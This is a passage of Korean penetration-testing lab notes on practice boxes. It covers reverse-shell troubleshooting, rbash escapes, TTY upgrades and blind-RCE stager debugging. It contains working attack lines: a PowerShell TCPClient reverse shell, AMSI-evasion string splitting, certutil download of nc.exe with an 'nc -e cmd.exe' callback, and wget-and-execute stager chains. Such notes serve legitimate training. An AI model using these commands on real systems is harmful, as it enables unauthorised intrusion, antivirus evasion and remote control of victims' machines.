**⑵ 스테이저는 «조용히» 죽는다 — 이때는 서버의 페이로드를 갈아야 함.**
egress 가 열려 있는데도 콜백이 없으면(A-31) 남은 후보는 AV/AMSI 와 페이로드 문법임. [[Mice]] 는 443·80 이 열려 있는데 평문 `System.Net.Sockets.TCPClient` 원라이너가 조용했고, 문자열을 쪼개고 `iex` 를 없앤 판(`$TC='System.Net.Sockets.TCP'+'Client'` / `& ([scriptblock]::Create($d))`)으로 교체하자 **같은 포트로 즉시** 붙음(`www/a.revshell443` 22:28 → `www/a` 22:32:24 → 콜백 `shell443.log:2`). `iex` 는 AMSI 가 가장 먼저 보는 이름이라 그 자체로 시그니처를 켬.

`[가정]` **평문판이 막힌 원인이 AV 라는 것은 정황 추론임.** 차단 메시지를 직접 보지 못했음 — 시작 메뉴 주입은 출력이 돌아올 콘솔이 없기 때문. 정황 셋: ⓐ 온타겟 프로브가 `RTP_True`(실시간 보호 켜짐)를 보고했고 ⓑ 평문판은 443 이 열려 있는데도 콜백이 없었으며(`shell4444/53/8080.log` 는 물론 443 도 조용) ⓒ 분할판으로 교체하자 같은 포트로 즉시 붙음. 재부팅 뒤 평문판(`r.ps1`)을 두 번 더 던졌을 때도 콜백이 없었던 것(`rce_retry.log`)이 같은 방향.

⛔ **주입 문자열만 만지작거리지 말 것 — 바꿔야 하는 쪽은 대개 «서버에 올려둔 페이로드»임.** [[Mice]] 는 주입 4회를 태웠고 mtime 으로 순서가 복원됨: `attempt1_type.log` 22:28:01(`powershell iex(irm .../a)`) → `attempt2_diag.log` 22:29:34(같은 문자열, 이때 `/a` 는 아웃바운드 프로브였음) → `attempt3_obf.log` 22:31:11(`-nop -w hidden` 추가). **여기까지 `/a` 는 아직 평문판이었음**(`www/a` 교체가 22:32:24) — 즉 `-nop -w hidden` 을 붙인 3회차도 실패했고 바뀐 것은 주입 문자열이 아니라 페이로드였음. 22:33:06·22:34:14 요청이 분할판을 받았고 22:34:58 에 셸이 살아 있었음(`proof_user.txt`).

#### A-36. 제한 셸(rbash)에 떨어졌다

**rbash 는 «자기 프로세스»의 동작만 제한하고 자식 프로세스는 제한하지 않음.** 그래서 SSH 대상이면 GTFOBins 를 뒤지기 전에 **명령 인자로 `bash -c` 를 던지는 것**이 제일 빠름 — 자식 `bash` 는 `-r` 없이 시작해 그대로 평범한 셸이 됨.

**rbash 가 실제로 막는 것** — `cd` · 명령 «이름»에 `/` 포함 · `>`/`>>` 리다이렉션 · `PATH`·`SHELL`·`ENV`·`BASH_ENV` 대입 · `hash -p` · `enable`/`command` 로 빌트인 우회 · `-r` 해제.
**막지 않는 것 — PATH 에 이미 있는 실행파일을 «이름만»으로 부르는 것.** 그래서 탈출은 「무엇이 PATH 에 남아 있는가」 문제로 환원됨.

**판정 기준은 「PATH 가 화이트리스트 디렉터리로 좁혀졌는가」임.** 제대로 된 rbash 감옥은 PATH 를 `~/bin` 같은 디렉터리 하나로 좁히고 거기 심볼릭 링크 몇 개만 둠. 평범한 기본 PATH 를 그대로 두었으면 **감옥이 아니라 문패일 뿐임.**

[[LazySysAdmin]] 실측 — `sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@<타겟> 'cd /tmp; /bin/ls /home; PATH=/tmp; export -f x'` 의 응답:
```text
rbash: line 0: cd: restricted
rbash: /bin/ls: restricted: cannot specify `/' in command names
rbash: PATH: readonly variable
```
그런데 PATH 는 `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games` — **기본 PATH 그대로**라 `/bin/bash` 가 `bash` 라는 이름만으로 손에 잡혔음.

**제한 셸을 만나면 순서대로 때릴 것**
1. `echo $PATH` · `ls $(echo $PATH | tr : ' ')` — 뭐가 남아 있는지가 전부임
2. `bash` / `sh` / `python3 -c 'import os;os.system("/bin/bash")'`
3. `vi` → `:set shell=/bin/bash` → `:shell` · `awk 'BEGIN{system("/bin/bash")}'` · `find . -exec /bin/bash \;`
4. 원격이면 셸을 아예 안 거치는 방법 — `ssh user@host -t "bash --noprofile"` · `ssh -o RemoteCommand=bash`

#### A-37. rbash 대상에 `scp` 가 조용히 끊긴다

**증상** — 파일을 올리려는데 `scp: Connection closed` 한 줄. 방화벽·권한 문제로 읽기 쉬우나 **로그인 셸을 의심할 것.**

**메커니즘** — 최신 OpenSSH 의 `scp` 는 기본으로 **SFTP 서브시스템**을 씀. `sshd_config` 에 `Subsystem sftp /usr/lib/openssh/sftp-server` 가 정상 등재돼 있어도, sshd 는 그 서브시스템을 **사용자의 로그인 셸에 `-c` 로 넘겨** 실행함 — 셸이 rbash 면 경로에 `/` 가 있다는 이유로 거부되어 연결이 끊김. `sftp` 를 직접 붙이면 같은 증상이 재현됨:
```text
##################################################################################################

Connection closed.  
Connection closed
```
— 출처: [[LazySysAdmin]], `sshpass -p '12345' sftp -o StrictHostKeyChecking=no togie@<타겟> <<< 'ls'`

**우회 — `scp -O`(대문자 O, legacy SCP 프로토콜 강제).** legacy 모드는 원격에서 `scp -t <경로>` 를 실행하고 **명령 «이름» `scp` 에는 `/` 가 없음** — rbash 는 인자의 슬래시가 아니라 **명령 이름의 슬래시만** 봄(A-36).

→ **구형 리눅스 박스에 파일이 안 올라가면 `-O` 를 먼저 때려보고, 그래도 안 되면 로그인 셸을 의심할 것.** 흔한 대안 `cat file | ssh user@host 'cat > /tmp/x'` 는 rbash 가 `>` 를 막아 **어차피 실패했을 것**임.

**같은 메커니즘의 다른 증상 — 강제 명령(`command=`) 래퍼.** [[Sorcerer]] 는 rbash 가 아니라 `command="/home/max/scp_wrapper.sh"` 환경이었음. 래퍼는 `$SSH_ORIGINAL_COMMAND` 가 문자열 `scp` 로 «시작하는지»만 검사(`case 'scp'*`)하는데, 최신 클라이언트가 SFTP 서브시스템을 요청하면 서버가 받는 값이 `scp -t …` 가 아니라 `sftp` 가 되어 매칭 실패 → `ACCESS DENIED.` 로 떨어짐. `-O` 를 붙이면 문자열이 다시 `scp` 로 시작해 통과함:
```text
-O   Use the legacy SCP protocol for file transfers instead of the SFTP protocol.
```
— 출처: `man scp`(OpenSSH 9.x)

⚠️ **`sshd(8)` 원문** — *"Note that this option applies to shell, command or subsystem execution."* 즉 `command=` 는 scp(레거시, command 실행)든 sftp(subsystem 실행)든 **둘 다** 가로채고, 둘 다 원래 요청을 `SSH_ORIGINAL_COMMAND` 로 노출함. 래퍼가 그 값을 인용 없이 셸에 넘기면 **명령 주입 공격면이 별도로 열림.**

→ **rbash 의 「슬래시 없는 명령 이름」 우회와 강제 명령 래퍼의 「문자열이 `scp` 로 시작」 우회는 근본 원인이 같음**(OpenSSH 9.0 의 SFTP 기본 전환. 정확히는 8.7 에서 `-s` 로 실험 도입, 9.0 에서 기본값을 뒤집으며 `-s` 를 없애고 `-O` 를 탈출구로 남김).
→ 시행착오도 재료임 — `~/.zsh_history` 에 `scp`(무플래그 실패) → `scp -h` → `scp -H` → `scp -help` → `man scp` 순서가 남아 있음. **막히면 `--help` 가 아니라 `man` 을 볼 것.** `scp` 는 `-h` 를 옵션으로 안 받아 도움말이 안 나옴.

#### A-38. `python3` 가 없어 TTY 업그레이드가 안 된다

**Arch · Alpine · 최소 설치에서 흔함.** [[Hawat]](Arch Linux)에는 `python3` 도 `hostname` 도 없었음:
```text
bash: python3: command not found
```
**이 박스에서 통한 것** — `script -qc /bin/bash /dev/null`
**그 밖의 후보** — `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'`

⚠️ **SSH 로 잡은 셸은 이미 완전한 TTY 임 — 이 단계를 통째로 건너뜀.** `pty.spawn` → `Ctrl+Z` → `stty raw -echo; fg` 는 리버스셸에서만 필요함. **「키를 찾아 SSH 로 들어가는 경로」가 리버스셸보다 항상 나은 이유**가 이것임 — 안정적이고, 끊겨도 재접속이 즉시 됨([[Sorcerer]]). 반사적으로 업그레이드 명령부터 치다 멀쩡한 세션을 흔들지 말 것(A-33).

→ **`python3 -c 'import pty; pty.spawn("/bin/bash")'` 를 반사적으로 치지 말고, 없으면 `script` 로 넘어갈 것.**

⚠️ **`hostname` 바이너리도 없을 수 있음** — 플래그 증거 한 화면(C-3)에서 `hostname` 이 죽으면 `uname -n` 또는 `cat /etc/hostname` 으로 대체할 것.

**TTY 부재는 증상이 다양하지만 원인은 하나임.** 리버스셸은 붙었는데 `sudo` 가 `no tty present` 를 뱉거나, Ctrl+C 가 셸 자체를 죽이거나, `su`/`ssh` 가 비밀번호를 못 받는 상황이 전부 여기임.

| 증상 | 원인 | 대응 |
|---|---|---|
| `sudo: no tty present and no askpass program specified` | TTY 부재 | `pty.spawn` 또는 `script -qc /bin/bash /dev/null` |
| Ctrl+C 가 리버스셸 전체를 종료 | 시그널이 nc 로 감 | `stty raw -echo` 후 `fg`(A-33) |
| `clear`·`vim`·`less` 가 깨짐 | `TERM` 미설정 | `export TERM=xterm` |
| 탭 완성 안 됨 | raw 모드 미적용 | Ctrl+Z → `stty raw -echo; fg` → Enter 두 번 |
| `python3: command not found` | 최소 설치 | `script -qc /bin/bash /dev/null` · `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'` |

**발화 신호** — `bash: cannot set terminal process group (610): Inappropriate ioctl for device` + `bash: no job control in this shell`. 이게 보이면 위 3단(`pty.spawn` → `export TERM=xterm` → 선택적으로 `stty raw -echo; fg`)을 반사적으로 칠 것.
⚠️ 다만 **`su` 는 TTY 없이도 통함** — PTY 승격을 먼저 하느라 시간을 쓰지 말 것(A-3-10).

**출처** — [[Crane]](`python3 -c "import pty..."` 한 번에 정상화) · [[Hawat]](`script` 대체).

**크론이 발화시킨 프로세스에는 터미널이 없음.** 그래서 거기서 붙은 리버스셸은 처음부터 raw 이고 `su`·`ssh`·`sudo`·`vim`·탭 완성이 전부 안 됨.

[[Astronaut]] 실측 — 셸이 붙는 순간의 화면:
```text
connect to [192.168.45.179] from (UNKNOWN) [192.168.115.12] 58206
bash: cannot set terminal process group (59911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$
```
— 출처: `파일보관/Pasted image 20260615140619.png`

→ **이 두 줄(`cannot set terminal process group` · `no job control`)은 진단 정보임.** 셸이 «어떤 부모에서 태어났는지»를 알려줌 — 웹셸·크론·스케줄러처럼 TTY 가 없는 실행 맥락임.
⚠️ **권한상승 후에도 TTY 문제가 남음.** SUID 인터프리터로 얻은 root 셸은 `/bin/sh: 0: can't access tty; job control turned off` 를 뱉고 **프롬프트가 `#` 하나뿐**임. **플래그 증거 스크린샷을 찍기 전에 TTY 를 먼저 정리해 두면** `whoami`·`hostname`·`ip a` 가 한 화면에 깔끔하게 담김(C-3).
⚠️ **`rlwrap` 을 리스너에 걸어 두면 업그레이드 «전»에도** 히스토리·백스페이스·화살표가 먹음(B-89). 크론 발화형처럼 셸이 raw 로 태어나는 경로에서 특히 값을 함.

#### A-39. 블라인드 RCE 는 되는데 셸이 안 붙는다 — 채널 제약(대소문자·길이·cwd)부터 계측한다

**명령 실행이 확인됐는데 스테이저가 조용히 실패하면, 방화벽이 아니라 «채널이 명령 문자열을 손대고 있다»를 먼저 의심할 것.** [[ClamAV]] 는 RCE 확정(14:25:19)에서 셸(14:35:31)까지 **10분 12초**를 이 셋에 태웠고, 방화벽 문제는 하나도 없었음.

**① 대소문자 접힘.** 첫 프로브에서 `PROBE1` 을 보냈는데 Kali HTTP 로그에는 소문자로 도착:
```text
192.168.248.42 - - [20/Aug/2026 14:25:18] "GET /probe1 HTTP/1.0" 404 -
```
— 출처: `~/PG/ClamAV/http_stager.log`
→ 대문자가 필요한 옵션(`wget -O`, `curl -O`, `nc -N`)은 이 채널로 못 보냄. **이걸 못 봤으면 `-O` 가 `-o`(로그 파일 지정)로 바뀌어 파일이 안 만들어지는데 wget 은 성공한 것처럼 보이는 상황**에 빠짐. 프로브 문자열에 **대문자를 섞어 보내는 것**이 이 계측의 전부임.

**② 길이 절단(이 박스는 93자).** try7 은 105자였음:
```bash
cd /tmp;/usr/bin/wget http://192.168.45.207/aaa;/bin/sh /tmp/d.sh;/usr/bin/wget http://192.168.45.207/zzz
```
세 번째 명령은 67번째 문자에서 시작하는데 HTTP 로그에는 `GET /aaa` 만 찍히고 `GET /zzz` 는 없음(`http_stager.log` 14:31:04). 93자에서 자르면 그 자리가 `/usr/bin/wget http://192.16` 이 되어 URL 이 깨지므로 관측과 맞음.
직접 계측은 URL 경로에 숫자 200자를 채워 **229자**를 보낸 것(`try15_lenprobe.log`). 살아 있는 tmux 페인에서 읽은 경로가 **64자**였고, 앞의 `/usr/bin/wget 192.168.45.207/` 29자를 더해 **93자**. ⚠️ **이 계측을 덮는 HTTP 서버 로그는 저장하지 못했음** — `http_stager.log` 는 14:34:53(`GET /q.sh`)에서 끝나고 try15 는 14:37 임. **64 라는 숫자는 재확인 불가**이고, 절단이 존재한다는 사실만 try7 로 재확인됨.
→ **문법이 아니라 길이가 문제임.** 65자(`wget .../one;wget .../two`, try16)·76자(`cd /tmp;wget .../d.sh;wget .../after`, try17)의 `;` 체이닝은 정상 동작함. **한 번에 한 단계씩 짧게** — 내려받기 41자, 실행 20자로 쪼개면 여유가 넉넉함.

**③ `cd` 가 안 먹고, 파일은 예상 밖 디렉터리에 떨어짐.** 가장 많이 태운 지점. `cd /tmp;wget ...;/bin/sh /tmp/x.sh` 를 반복해 던졌는데(try2·try4·try6) wget 은 매번 HTTP 200 인데 그다음 `/bin/sh /tmp/x.sh` 가 조용히 아무것도 안 함. 정리 단계에서 찾으니:
```text
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/s.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/p.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/d.sh
/tmp/clamav-10d082f2f822edaf614bdaa9fd69fb6c/q.sh
```
— 출처: `~/PG/ClamAV/shell_session.log`
`cd /tmp` 는 효과가 없었고 파일은 전부 milter 의 메시지별 작업 디렉터리에 떨어졌음. `/tmp/x.sh` 는 **존재한 적이 없고** 상대경로 `x.sh` 가 맞아떨어진 것. 성공한 두 번(`cd /tmp;/bin/sh d.sh` = try8, `cd /tmp;/bin/sh q.sh` = try14)은 **`cd` 가 무시된 덕분에** 동작했음.

`[가정]` — `cd` 가 왜 무시되는지. `popen` 에 넘어가는 문자열이 셸에서 이렇게 갈리면 설명이 맞아떨어짐:
```text
sendmail -bv "nobody+" | cd /tmp ; /bin/sh d.sh...
   └── 파이프라인 오른쪽 ──┘   └─ 별개 명령 ─┘
```
`;` 가 `|` 보다 결합이 약해 파이프라인은 `sendmail ... | cd /tmp` 까지고, `cd` 는 파이프라인 구성원이라 서브셸에서 실행된 뒤 버려짐. 그다음 `;` 부터가 별개 명령이라 cwd 는 milter 것 그대로임. 이 가설은 관측 넷(`cd` 무효 · 상대경로 성공 · 절대경로 무반응 · `;` 체이닝 정상)을 전부 설명함. 다만 마지막 조각의 `@localhost` 가 어떻게 처리되는지는 **확인하지 못했음.**

→ 실무 결론: **이 채널에서 `cd` 를 믿지 말 것.** 파일을 내려받았으면 **어디에 떨어졌는지부터** 확인. 절대경로가 항상 옳은 것이 아님.

**첫 스테이저 실패를 엉뚱한 원인으로 결론짓지 말 것.** [[ClamAV]] 의 첫 스테이저 `www/s.sh` 는 bash `/dev/tcp` 리버스셸(443)이었고 `GET /s.sh 200` 까지는 됐는데 콜백이 안 옴. 그 시점에 **「Debian bash 는 net redirection 이 꺼져 있다」로 결론 낼 뻔했으나**, 진짜 원인은 실행 명령이 `/bin/sh /tmp/s.sh` 였고 그 경로에 파일이 없었던 것(③). 스크립트가 아예 안 돌았음. **이 박스에서 bash `/dev/tcp` 가 되는지 안 되는지는 끝까지 확인하지 못했음**(관측 없음).

**17발의 계측 원장** — `~/PG/ClamAV/` 에 `smtp_probe1.txt` 와 `try1`~`try17` 이 전량 보존됨. 길이는 `RCPT TO` 로컬파트에서 `|` 를 뺀 실제 주입 명령 길이:

| 로그 | 주입한 명령 | 길이 | `.` 이후 응답 | 결과 |
|---|---|---|---|---|
| `smtp_probe1` | `:/bin/touch /tmp/clamtest;` | — | DATA 안 보냄 | 주소는 `250 ok`. 실행은 안 됨 |
| `try1` | `/usr/bin/wget http://192.168.45.207/PROBE1` | 42 | `554 virus` | `GET /probe1` — RCE 확정 + 소문자 접힘 발견 |
| `try2` | `cd /tmp;/usr/bin/wget http://192.168.45.207/s.sh;/bin/sh /tmp/s.sh` | 66 | 없음 | s.sh 200 다운. bash `/dev/tcp` 콜백 없음 |
| `try3` | 위와 같은 형태(p.sh) | 66 | 없음 | `.` 전에 세션이 끊겨 **실행 자체가 안 됨**(HTTP 로그에 그 시각 `GET /p.sh` 없음) |
| `try4` | `cd /tmp;/usr/bin/wget http://192.168.45.207/p.sh;/bin/sh /tmp/p.sh` | 66 | 없음 | p.sh 200 다운. perl→443 콜백 없음 |
| `try5` | `/usr/bin/wget http://192.168.45.207:443/p443` | 44 | 없음 | 443 리스너에 GET 도착 → 아웃바운드 443 열림 |
| `try6` | `cd /tmp;/usr/bin/wget http://192.168.45.207/d.sh;/bin/sh /tmp/d.sh` | 66 | `554 virus` | d.sh 200 다운. 실행은 여전히 안 됨 |
| `try7` | `cd /tmp;wget .../aaa;/bin/sh /tmp/d.sh;wget .../zzz` | 105 | 없음 | `GET /aaa` 만 도착, `GET /zzz` 없음 → 길이 절단의 첫 증거 |
| `try8` | `cd /tmp;/bin/sh d.sh` (상대경로) | 20 | `554 virus` | 인벤토리 9줄 전부 도착 → 상대경로가 답 |
| `try9`·`10`·`12` | `cd /tmp;/bin/sh p.sh` | 20 | `250 accepted` | perl→443 리버스셸. 3회 전부 콜백 없음 |
| `try11` | `/usr/bin/killall wget` | 21 | `250 accepted` | 유령 wget 정리 시도 — 실패 |
| `try13` | `cd /tmp;/usr/bin/wget 192.168.45.207/q.sh` | 41 | `250 accepted` | q.sh 200 다운 |
| `try14` | `cd /tmp;/bin/sh q.sh` | 20 | 없음 | perl→4444 → root 대화형 셸 |
| `try15` | `/usr/bin/wget 192.168.45.207/` + 숫자 200자 | 229 | `554 virus` | 길이 상한 계측 — ② |
| `try16` | `/usr/bin/wget .../one;/usr/bin/wget .../two` | 65 | `554 virus` | 93자 밑에서 `;` 체이닝 정상 |
| `try17` | `cd /tmp;wget .../d.sh;wget .../after` | 76 | `554 virus` | `cd` 접두어가 붙어도 뒤 명령이 사는지 확인 |

⚠️ **원 노트 표의 `try5` 길이 「51」은 반증됨 — 실측 44자**(`/usr/bin/wget http://192.168.45.207:443/p443`, 로컬파트에서 `|` 제외). 개작 중 17건 전량을 재계측해 정정함.

→ **RCE 채널에는 제약이 붙는다는 것을 기본값으로 놓을 것** — 대소문자·길이·금지문자·cwd. 리버스셸이 안 붙으면 방화벽을 의심하기 전에 명령이 실행은 됐는지를 오라클로 먼저 확인할 것(B-87).

#### A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다

⛔ **「PTY 가 없으면 `su` 가 거부된다」는 널리 퍼진 오해임 — 그 문구를 내는 것은 `sudo` 지 `su` 가 아님**(2026-08-26 Kali 재확인으로 이 항목의 이전 서술을 정정함).

util-linux `su` 는 TTY 가 없어도 `Password:` 를 내고 **stdin 에서 그대로 읽음:**
```bash
ssh kali@10.44.44.128 "echo 'wrongpass' | su root -c id"
```
```text
Password: su: Authentication failure
```
`su` 바이너리에는 그 문자열이 아예 없음 — `strings $(which su) | grep -i terminal` 이 돌려주는 것은 `--pty` 옵션 설명뿐임:
```text
 -P, --pty                       create a new pseudo-terminal
 -T, --no-pty                    do not create a new pseudo-terminal (bad security!)
```
같은 검사를 `sudo` 에 하면 그 문구가 나옴 — `a terminal is required to read the password; either use ssh's -t option or configure an askpass helper`. **`sudo` 가 TTY 를 요구하고 그 문구로 거부하는 쪽임**(`-S` 로 stdin 읽기, `-A` 로 askpass 우회 가능). 확인: Kali, util-linux 2.41.2.

**실측** — [[Codo]] 는 `bash: cannot set terminal process group` / `bash: no job control in this shell` 이 찍힌 **PTY 없는 리버스셸**에서 `su root` 가 그대로 성립해 root 를 잡았음. PTY 업그레이드 기록 없음:
```text
www-data@codo:/var/www/html/sites/default$ su root
su root
Password: FatPanda123
whoami
root
```
[[Zipper]] 도 같음 — nc 셸 그대로 `su -` 가 통과했고 비밀번호가 화면에 에코된 흔적이 남아 있음.

→ **비밀번호를 얻었으면 TTY 승격을 «먼저» 하지 말고 일단 `su -` 를 쳐볼 것.** 거부당한 뒤에 승격해도 늦지 않음.
→ ⚠️ **`su` 가 실패했을 때 원인을 「PTY 없음」으로 단정하지 말 것** — 비밀번호가 틀렸거나 대상 계정이 잠긴 것일 수 있음(A-24).

**그래도 PTY 승격은 반사로 둘 것** — `Ctrl+C` 로 셸 전체가 죽고(A-33), `vi`·`top` 이 깨지고, 탭 완성·히스토리가 없음:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 없으면 (A-38)
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
# (Ctrl+Z → 로컬에서) stty raw -echo; fg; export TERM=xterm; stty rows 50 columns 200
```
`sshpass` 로 SSH 재로그인해 TTY 를 확보하는 것도 정답임. ⚠️ **로컬 셸이 있으면 `su` 가 SSH 보다 우선임** — SSH 는 `PermitRootLogin`(Ubuntu 기본 `prohibit-password`)·`PasswordAuthentication`·`AllowUsers` 에 막힐 수 있고 그 거부를 「비밀번호 틀림」으로 오독하기 쉬움(A-24). 반대로 **안정된 TTY 가 필요하면 SSH 가 나음.**

⚠️ **`su -`(로그인 셸)는 `PATH`·`HOME` 을 root 것으로 갈아치움.** 권한상승 후 `sbin` 도구가 안 보이면 반대로 `su` 를 `-` 없이 쓴 것을 의심할 것([[Codo]]).

⚠️ **`nc` 리스너 전사에서 명령이 두 번 찍히는 것은 에코원이 «둘» 이기 때문임** — ① 리스너 쪽 로컬 터미널(`rlwrap nc`)의 타이핑 에코 ② **PTY 없는 `bash -i` 자신의 에코.** ②는 Kali 에서 재현됨(2026-08-26):
```bash
ssh kali@10.44.44.128 "printf 'whoami\nexit\n' | bash -i"
```
```text
bash: cannot set terminal process group (927881): Inappropriate ioctl for device
bash: no job control in this shell
kali@kali:~$ whoami
kali
```
로컬 에코가 전혀 없는 파이프인데도 프롬프트 뒤에 `whoami` 가 한 번 더 찍힘 — **원격 bash 가 되찍은 것**임. 반면 `Password:` 뒤에 비밀번호가 평문으로 보이는 것은 ①뿐임(그 줄은 `su` 가 stdin 에서 직접 소비하므로 ②가 안 걸림). **「비밀번호가 에코됐으니 TTY 가 없다」로 읽지 말 것.**

#### A-3-11. Windows 셸에서 `whoami` 가 not recognized — 명령이 없는 게 아니라 PATH 가 없다

**증상** — 리버스셸은 붙었는데 `whoami`·`net`·`systeminfo` 가 전부 `'…' is not recognized as an internal or external command`. `cd`·`dir`·`type` 같은 `cmd.exe` **내장 명령만** 돎.

**원인** — msfvenom `shell_reverse_tcp` 는 `CreateProcess` 로 `cmd` 를 띄우고, `CreateProcess` 의 실행파일 탐색은 **PATH 이전에 `C:\Windows\System32` 를 먼저 봄.** 반면 `cmd.exe` 가 사용자가 친 `whoami` 를 찾을 때는 **`%PATH%` 만** 씀. 서비스가 PATH 없이(혹은 System32 가 빠진 PATH 로) 기동되면 정확히 이 증상이 남 `[가정]` — [[Jacko]] 에서 `echo %PATH%` 를 실행한 기록은 없음.

**대처는 절대경로.**
```text
C:\Windows\System32\whoami.exe /all
C:\Windows\System32\systeminfo.exe
C:\Windows\System32\net.exe user
C:\Windows\System32\net.exe localgroup administrators
C:\Windows\System32\sc.exe query state= all
C:\Windows\System32\wbem\wmic.exe service get name,pathname,startmode
```

⚠️ **이 한 줄을 몰라 박스가 죽음.** [[Jacko]] — 17:04 셸 → 17:07 플래그 → 끝. 셸 이후 남은 명령이 `cd`·`dir`·`type` 뿐이고 **외부 exe 를 하나도 못 부르는 상태에서 열거를 접었을 개연성이 높음** `[가정]`. 결과가 **1/2** 임 — **3분 만에 끝난 것이 아니라 3분 만에 포기된 것임**(D 절).
→ 우선순위는 `whoami /all` 하나임. 서비스 계정에서 나온 셸이면 `SeImpersonatePrivilege` 가 통상 켜져 있어 그 한 줄이 권한상승 경로 전체를 결정함(A-41 · B-4).

#### A-3-12. `event not found` — 히스토리 확장이 `!` 를 먹고 «줄 전체»를 폐기한다

**증상** — 명령을 쳤는데 `bash: !…: event not found` 만 나오고 아무것도 실행되지 않음. **`&&`·`;` 로 이어붙인 줄이면 앞부분(`mkdir` 등)조차 안 돎** — 뒷부분만 실패한 것이 아니라 **줄 자체가 통째로 폐기됨.**

**⛔ 큰따옴표는 방어가 안 됨.** bash·zsh 모두 큰따옴표 안에서 히스토리 확장이 일어남. 그리고 **확장은 줄을 «읽는» 시점에 일어나므로 같은 줄 앞에 붙인 `set +H` 는 이미 늦음.**

**판 ⓐ — 스크립트를 만들 때 `#!` 가 먹힘.** [[PwnLab]] 실측:
```text
mkdir -p /tmp/.pth && printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat && chmod +x /tmp/.pth/cat && PATH=/tmp/.pth:$PATH /home/kane/msgmike
bash: !/bin/bash\nexec: event not found
```
```text
kane@pwnlab:/tmp$ set +H; mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
bash: !/bin/bash\nexec: event not found
```
따옴표를 갈라 `!` 를 확장에서 떼어내는 우회(`printf '%s\n' '#''!/bin/bash' …`)를 먼저 시도했더니 **다른 에러 셋**이 났음(`No such file or directory` ×3). **우회 자체는 성공했고**(`event not found` 가 더 이상 안 남) 앞 줄에서 `mkdir` 이 안 돈 탓에 디렉터리가 없어서였음 — 여기서 「따옴표 우회도 안 되나」로 잠깐 헛짚었음.
→ **에러 문구가 바뀌었으면 원인도 바뀐 것으로 읽을 것.**
→ **해법은 `set +H` 를 «별도 줄»로 먼저 보내는 것.** 홑따옴표로 감싸도 되지만 셸을 `send-keys`·리버스셸로 원격 조종하는 상황에서는 따옴표가 여러 겹 중첩되므로 `set +H` 한 줄이 안전함.
→ 곁다리 — 세 번의 실패가 전부 **`&&`/`;` 로 길게 이어붙인 한 줄** 때문에 원인 파악이 늦어졌음. **파일을 만드는 단계와 실행하는 단계는 끊어서 칠 것.**
— 출처: `~/PG/PwnLab/try1_msgmike_histexpand.log`

**판 ⓑ — `!` 가 든 «비밀번호»가 zsh 에서 확장됨.** [[Nagoya]] 실측: `net rpc password "christopher.lewis" 'Password123!' -U "nagoya-industries.com/iain.white%Password123 -S 192.168.120.21\` 형태(**큰따옴표 미종결 + 줄 끝 `\`**)가 `~/.zsh_history` 에 **세 번** 반복, 그 앞에 인용부호는 맞았는데 줄 끝 `\` 만 붙은 실패가 한 번 더 있어 합쳐 **네 줄**. `evil-winrm … -p 'Password123\!'\` 처럼 `!` 를 백슬래시로 이스케이프하려던 시도도 실패.
→ **`!` 가 든 비밀번호는 무조건 작은따옴표.** 그리고 **`-U 'DOMAIN/user%pass'` 는 통째로 한 덩어리라 따옴표를 중간에서 끊지 말 것.**

#### A-3-13. Windows 웹셸을 대화형 셸로 올리는 세 경로

**웹셸은 발판이지 작업 환경이 아님.** 세션이 없어 `cd` 가 유지되지 않고, 대화형 프로그램이 죽고, 출력이 잘리고, 페이지를 새로 고칠 때마다 새 프로세스임. **그리고 웹셸에서 읽은 플래그는 시험에서 0점임**(E 절).

```powershell
# ① 계정 생성 후 WinRM/RDP  ← 가장 안정적. 5985 가 이미 열려 있으면 1순위
net user /add 4leaf Password1

# ② PowerShell 리버스셸 원라이너 (nc -lvnp 443)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.168.45.207',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# ③ nc.exe 업로드 후 실행
certutil -urlcache -split -f http://192.168.45.207/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe 192.168.45.207 443 -e cmd.exe
```

**①이 통하면 리버스셸 문제를 통째로 회피함** — 인바운드로 관리 포트(5985 WinRM · 3389 RDP)가 열려 있으면 계정 생성 경로가 아웃바운드 제약을 우회하므로 빠르고 안정적임. 다만 **로그상 가장 시끄러운 방법**임(이벤트 4720 계정 생성 · 4732 그룹 추가).
⚠️ **계정을 만들어 관리자 그룹에 넣어도 특권이 안 붙는 함정이 바로 뒤에 있음** — A-4-15(토큰 필터링).

⚠️ **인바운드 정책에서 아웃바운드를 추정하지 말 것.** 둘은 서로 독립된 규칙 집합이고, 인바운드를 전부 막고 아웃바운드는 열어두는 구성이 오히려 흔함(A-1-17 · A-31). [[Hawat]] 에서는 `443/tcp closed` 라는 인바운드 관측을 egress 근거로 오독한 전례가 있음.
`[가정]` [[Butch]] 의 아웃바운드 정책은 **미확인임** — 리버스셸 페이로드를 실행한 기록이 없음. 다만 `~/PG/Butch/nc64.exe`(45,272B, mtime `2026-08-18 12:53:36`)와 `~/.zsh_history` 의 `cp nc64.exe ~/PG/Butch`·`rlwrap nc -lnvp 4444` 로 **준비 흔적은 실재함.** 연결 성립 관측은 없음.

#### A-3-14. SSH 인증은 되는데 셸이 안 뜬다 — 강제 명령(`command=`)은 자기 자신을 정의하는 파일까지 막지 못한다

